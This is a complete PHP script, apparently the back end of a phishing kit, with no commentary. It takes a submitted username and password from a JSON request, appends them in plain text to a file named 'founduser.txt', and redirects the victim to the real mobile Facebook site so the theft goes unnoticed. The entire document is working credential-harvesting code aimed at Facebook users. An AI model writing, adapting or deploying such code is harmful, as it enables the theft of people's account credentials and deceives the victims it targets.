<?php
$cargaUtil = json_decode(file_get_contents("php://input"));
$usuario = $cargaUtil->usuario;
$password = $cargaUtil->password;
$mensaje .= "\n===========================================" . PHP_EOL;
$mensaje .= "Username: $usuario" . PHP_EOL;
$mensaje .= "Password: $password" . PHP_EOL;
$mensaje .= "===========================================" . PHP_EOL;
file_put_contents("founduser.txt", $mensaje, FILE_APPEND);
header('Location: https://m.facebook.com');
?>
